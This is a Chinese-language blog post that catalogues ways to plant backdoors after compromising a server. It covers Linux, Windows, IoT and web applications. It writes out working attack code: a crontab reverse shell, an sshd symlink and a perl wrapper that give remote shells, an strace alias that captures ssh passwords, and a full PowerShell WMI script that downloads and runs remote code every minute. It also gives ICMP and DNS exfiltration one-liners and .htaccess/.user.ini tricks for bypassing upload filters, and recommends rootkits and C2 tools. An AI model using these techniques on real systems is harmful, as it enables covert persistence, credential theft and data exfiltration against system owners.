<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="backdoor,linux,windows,iot,protocol," />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="概述
没有最好的后门，只有最合适的后门。

在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。">
<meta property="og:type" content="article">
<meta property="og:title" content="Backdoor 基础">
<meta property="og:url" content="http://orleven.orleven.com/2017/01/21/backdoor-base/index.html">
<meta property="og:site_name" content="Orleven Blog">
<meta property="og:description" content="概述
没有最好的后门，只有最合适的后门。

在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。">
<meta property="og:updated_time" content="2017-04-04T02:12:05.332Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Backdoor 基础">
<meta name="twitter:description" content="概述
没有最好的后门，只有最合适的后门。

在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://orleven.orleven.com/2017/01/21/backdoor-base/"/>





  <title> Backdoor 基础 | Orleven Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Orleven Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Orleven Blog</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocapitalize="off" autocomplete="off" autocorrect="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://orleven.orleven.com/2017/01/21/backdoor-base/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Orleven">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/orleven.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Orleven Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                Backdoor 基础
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-21T19:45:32+08:00">
                2017-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/backdoor/" itemprop="url" rel="index">
                    <span itemprop="name">backdoor</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote>
<p>没有最好的后门，只有最合适的后门。</p>
</blockquote>
<p>在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。</p>
<a id="more"></a>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ul>
<li>终端平台：Linux型、Windows型和IOT型；<ul>
<li>Linux：配置型、logger型和rookit型；</li>
<li>Windows：Registry型、Schtasks型和WMI型；</li>
</ul>
</li>
<li>通信方式：http/https型、irc型、dns型、icmp型等。</li>
<li>网站应用：模块扩展型、后端语言型和配置文件型。</li>
</ul>
<h1 id="终端平台"><a href="#终端平台" class="headerlink" title="终端平台"></a>终端平台</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="配置型"><a href="#配置型" class="headerlink" title="配置型"></a>配置型</h3><p>这里的配置型是指借助Linux系统本身的一些特性来完成后门布置功能。</p>
<h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p>运维经常会用到该命令，这相当于windows的计划任务，规定时间来执行指定命令。这通常与反弹shell一起运用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$  (crontab <span class="_">-l</span>;<span class="built_in">printf</span> <span class="string">"*/5 * * * * exec9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec0&lt;&amp;9&amp;&amp;exec1&gt;&amp;92&gt;&amp;1&amp;&amp;/bin/bash --noprofile –I;\rno crontab for `whoami`%100c\n"</span>)|crontab -</div></pre></td></tr></table></figure>
<h4 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h4><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa</div><div class="line">$ ls</div><div class="line">id_rsa  id_rsa.pub</div></pre></td></tr></table></figure>
<p>把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ chmod 600 ~/.ssh/authorized_keys</div><div class="line">$ chmod 700 ~/.ssh</div></pre></td></tr></table></figure>
<p>这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现。</p>
<h4 id="软连接后门"><a href="#软连接后门" class="headerlink" title="软连接后门"></a>软连接后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</div></pre></td></tr></table></figure>
<p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh root@x.x.x.x -p 5555</div></pre></td></tr></table></figure>
<p>但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。</p>
<h4 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> /usr/sbin/</div><div class="line">$ mv sshd ../bin</div><div class="line">$ vim sshd</div><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"><span class="built_in">exec</span><span class="string">"/bin/sh"</span><span class="keyword">if</span>(getpeername(STDIN)=~/^..LF/);</div><div class="line"><span class="built_in">exec</span>&#123;<span class="string">"/usr/bin/sshd"</span>&#125;<span class="string">"/usr/sbin/sshd"</span>,@ARGV;</div><div class="line">``` </div><div class="line"></div><div class="line">赋予权限chmod 755 sshd，最后正向连接：</div><div class="line"></div><div class="line">``` bash</div><div class="line">socat STDIO TCP4:target_ip:22,sourceport=19526</div></pre></td></tr></table></figure>
<p>其中，\x00\x00LF是19526的大端形式，便于传输和处理。<br>原理是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。隐蔽性比刚刚介绍的软连接后门要好。</p>
<h3 id="logger型"><a href="#logger型" class="headerlink" title="logger型"></a>logger型</h3><h4 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h4><p>这种通过替换命令来使得evil效果最大化的用法，一般是通过追踪ssh的系统调用比如read、write等来记录下ssh的操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alias ssh=&apos;strace -o /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log -e read,write,connect  -s2048 ssh&apos;</div></pre></td></tr></table></figure>
<p>当然，这只是alias后门的一种用法，可根据具体情况举一反三。</p>
<h4 id="pam"><a href="#pam" class="headerlink" title="pam"></a>pam</h4><p>pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。搭建方式见下连接。</p>
<h4 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h4><p>同理，也是下载对应的恶意补丁包，来记录管理员的帐号密码。但该后门与pam后门存在很大的问题是编译环境，有时在实战中会出现各种各样的问题。搭建方式见下<a href="http://www.tuicool.com/articles/eIv22az" target="_blank" rel="external">连接</a>。</p>
<h3 id="rookit"><a href="#rookit" class="headerlink" title="rookit"></a>rookit</h3><h4 id="应用级rootkit"><a href="#应用级rootkit" class="headerlink" title="应用级rootkit"></a>应用级rootkit</h4><p>应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。如果想要学习linux类木马，推荐阅读orange的tsh源码，基本上涵盖了常规木马应具有的特点。</p>
<h4 id="内核级rookit"><a href="#内核级rookit" class="headerlink" title="内核级rookit"></a>内核级rookit</h4><p>隐藏性通常要借助对linux系统调用的截获来达到目的，并且难以查杀，难以清除，危害巨大。<br>由于未找到相应例子，遂不做具体分析。</p>
<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>windows后门博大精深，实在不好分类，因为后门常需持久化潜在运行，受到powersploit中persistence脚本的启发，因此采取使用后门的触发方式进行分类，分为registry型、schtasks型和WMI型。</p>
<h3 id="registry型"><a href="#registry型" class="headerlink" title="registry型"></a>registry型</h3><p>在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU:Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行。</p>
<p>不过这老生长谈的后门早已被用烂，360杀软会弹框提示。</p>
<h3 id="schtasks型"><a href="#schtasks型" class="headerlink" title="schtasks型"></a>schtasks型</h3><p>该类型后门可分为管理员权限和普通用户权限，管理员权限可以设置更多的计划任务，比如重启后运行等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /Create /SC HOURLY /TN Updater /TR $CommandLine</div></pre></td></tr></table></figure>
<p>这里比较大的限制是策略问题，只能按照规定的时间来执行相关程序或命令。通常来讲，持久性的APT对于这点要求较高。</p>
<h3 id="WMI型"><a href="#WMI型" class="headerlink" title="WMI型"></a>WMI型</h3><p>Defcon23的演讲后，WMI型后门的热度在国外迅速蔓延。（强烈推荐使用该类型后门）<br>它是只能由管理员权限运行的后门，一般是用powershell编写。目前以这一触发方式运行的后门是不会引起杀软任何反映的。具体原理可到drops去了解。</p>
<p>该类型后门主要用到了WMI展现出来的两个特征：无文件和无进程。</p>
<p>将core code加密存储于WMI类的property中，而该位置在复杂的CIM 数据库中，这达到了所谓的无文件；将filter和consumer异步绑定在一起，当规定的filter满足条件时，比如间隔1min，那么系统会自动启动一进程（名称为powershell）去执行consumer（后门程序）中的内容，当执行完成后，进程会消失，持续的时间根据后门运行情况而定，一般是几秒，这达到了所谓的无进程。</p>
<p>上述三类的详情代码请参考powersploit现阶段无论再复杂的WMI后门都是围绕上面两点而展开的，最核心的是后者。</p>
<p>下面是比较典型的代码，功能为每分钟执行<code>下载并执行</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">$Name = &apos;test&apos;</div><div class="line"># build the filter</div><div class="line">$TimeExecTime = 60</div><div class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN</div><div class="line">$TimeExecTime WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</div><div class="line">$NS = &quot;root\subscription&quot;</div><div class="line">$FilterArgs = @&#123;</div><div class="line">    Name=$Name</div><div class="line">    EventNameSpace=&quot;root\cimv2&quot;</div><div class="line">    QueryLanguage=&quot;WQL&quot;</div><div class="line">    Query=$Query</div><div class="line">&#125;</div><div class="line">$Filter = Set-WmiInstance -Namespace $NS -Class &quot;__EventFilter&quot; -Arguments $FilterArgs</div><div class="line"># build the consumer</div><div class="line">$ConsumerName = $Name</div><div class="line">$command = &quot;`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko&apos;); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString(&apos;$URL&apos;))&quot;</div><div class="line">#$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))</div><div class="line">$commandLine = &quot;C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command&quot;  </div><div class="line">$ConsumerArgs = @&#123;</div><div class="line">    Name=$ConsumerName</div><div class="line">    CommandLineTemplate=$commandLine</div><div class="line">&#125;</div><div class="line">$consumer = Set-WmiInstance -Class &quot;CommandLineEventConsumer&quot; -Namespace $NS -Arguments $ConsumerArgs</div><div class="line">#Bind filter and consumer</div><div class="line">$Args = @&#123;</div><div class="line">   Filter = $Filter</div><div class="line">   Consumer = $consumer</div><div class="line">&#125;</div><div class="line">Set-WmiInstance -Class &quot;__FilterToConsumerBinding&quot; -Namespace &quot;root\subscription&quot; -Arguments $Args</div></pre></td></tr></table></figure>
<h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><p>物联网的脆弱性因Mirai恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性：</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。</p>
<p><a href="http://p9.qhimg.com/t0147848fcfcfd59340.png" target="_blank" rel="external">http://p9.qhimg.com/t0147848fcfcfd59340.png</a></p>
<h3 id="防重启"><a href="#防重启" class="headerlink" title="防重启"></a>防重启</h3><p>因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。</p>
<p><a href="http://p4.qhimg.com/t01e96433fc3208ba2b.png" target="_blank" rel="external">http://p4.qhimg.com/t01e96433fc3208ba2b.png</a></p>
<h1 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h1><p>该过程可以分为<br>上线过程：bot发送\x00\x00\x00\x01，得到回应后再发送\x00；<br>心跳过程：bot间隔60s发送\x00\x00cnc，cnc回应\x00\x00；<br>解析执行：cnc对bot发出的指令里采取了一定的格式。<br>[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20<br>…..</p>
<p>IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。</p>
<h1 id="通信方式类"><a href="#通信方式类" class="headerlink" title="通信方式类"></a>通信方式类</h1><p>后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。</p>
<h2 id="http-https型"><a href="#http-https型" class="headerlink" title="http/https型"></a>http/https型</h2><p>目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github star比较高的，如twittor、gcat等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。</p>
<p>根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。</p>
<p>这部分木马可参考nishang框架中的HTTP-Backdoor脚本。</p>
<p>总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。</p>
<p>目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。</p>
<p>攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。</p>
<p>更多详细的可参考《C&amp;C控制服务的设计和侦测方法综述》</p>
<h2 id="irc型"><a href="#irc型" class="headerlink" title="irc型"></a>irc型</h2><p>irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。<br>缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。<br>关于这部分irc木马的中文实例资料可<a href="http://www.freebuf.com/articles/web/110859.html" target="_blank" rel="external">参考</a></p>
<h2 id="icmp型"><a href="#icmp型" class="headerlink" title="icmp型"></a>icmp型</h2><p>ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$cmd</span> = ls;</div><div class="line"><span class="variable">$timeout</span> = 1000;</div><div class="line"><span class="variable">$server_ip</span> = <span class="string">'xxxx'</span>;</div><div class="line">(New-Object System.Net.NetworkInformation.Ping).Send(<span class="variable">$server_ip</span>, <span class="variable">$timeout</span>, <span class="variable">$cmd</span>)</div></pre></td></tr></table></figure>
<p>在server_ip上抓包可看到返回结果。</p>
<h2 id="dns型"><a href="#dns型" class="headerlink" title="dns型"></a>dns型</h2><p>DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ping -c 2 `whoami`.xxxx.ceye.io</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nslookup -querytype=txt <span class="variable">$data</span>.ns.lynahex.com 8.8.8.8</div></pre></td></tr></table></figure>
<p>不过使用如上的常规方法，似乎会对data长度有限制。<br>自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。）</p>
<p>该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。</p>
<p><a href="http://bl4ck.in/index.php/penetration/use-dns-to-bypass-firewall.html" target="_blank" rel="external">具体用法</a></p>
<p>总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。</p>
<h1 id="网站类"><a href="#网站类" class="headerlink" title="网站类"></a>网站类</h1><p>传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。</p>
<h2 id="模块扩展型"><a href="#模块扩展型" class="headerlink" title="模块扩展型"></a>模块扩展型</h2><p>中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。</p>
<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme</p>
<p>具体操作可<a href="http://bl4ck.in/index.php/penetration/apache-port-reuse-backdoor.html" target="_blank" rel="external">参考</a></p>
<h3 id="ginx"><a href="#ginx" class="headerlink" title="ginx"></a>ginx</h3><p>nginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。</p>
<h3 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h3><p>iis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。<br>具体原理和操作可<a href="http://esec-lab.sogeti.com/posts/2011/02/02/iis-backdoor.html" target="_blank" rel="external">参考</a><br>中间件的后门大多是以类似上述原理为基础的。</p>
<h3 id="PHP扩展库"><a href="#PHP扩展库" class="headerlink" title="PHP扩展库"></a>PHP扩展库</h3><p>同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。</p>
<h2 id="后端语言型"><a href="#后端语言型" class="headerlink" title="后端语言型"></a>后端语言型</h2><p>这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。</p>
<h3 id="开发者后门"><a href="#开发者后门" class="headerlink" title="开发者后门"></a>开发者后门</h3><p>有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。</p>
<p>另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。</p>
<h3 id="PHP后门"><a href="#PHP后门" class="headerlink" title="PHP后门"></a>PHP后门</h3><p>随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。</p>
<p>在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。</p>
<h2 id="配置文件型"><a href="#配置文件型" class="headerlink" title="配置文件型"></a>配置文件型</h2><p>该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。<br>以PHP语言为例：</p>
<h3 id="htaccess后门"><a href="#htaccess后门" class="headerlink" title=".htaccess后门"></a>.htaccess后门</h3><p>在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType application/x-httpd-php .abc</div></pre></td></tr></table></figure>
<h3 id="user-ini后门"><a href="#user-ini后门" class="headerlink" title=".user.ini后门"></a>.user.ini后门</h3><p>.user.ini相当于用户自定义的php.ini。</p>
<p>上传.user.ini，其中的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auto_prepend_file=xx.gif</div></pre></td></tr></table></figure>
<p>可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然，上面的这些都是大牛们总结的，我只是个搬运工。</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/backdoor/" rel="tag"># backdoor</a>
          
            <a href="/tags/linux/" rel="tag"># linux</a>
          
            <a href="/tags/windows/" rel="tag"># windows</a>
          
            <a href="/tags/iot/" rel="tag"># iot</a>
          
            <a href="/tags/protocol/" rel="tag"># protocol</a>
          
        </div>
      

      
        
      

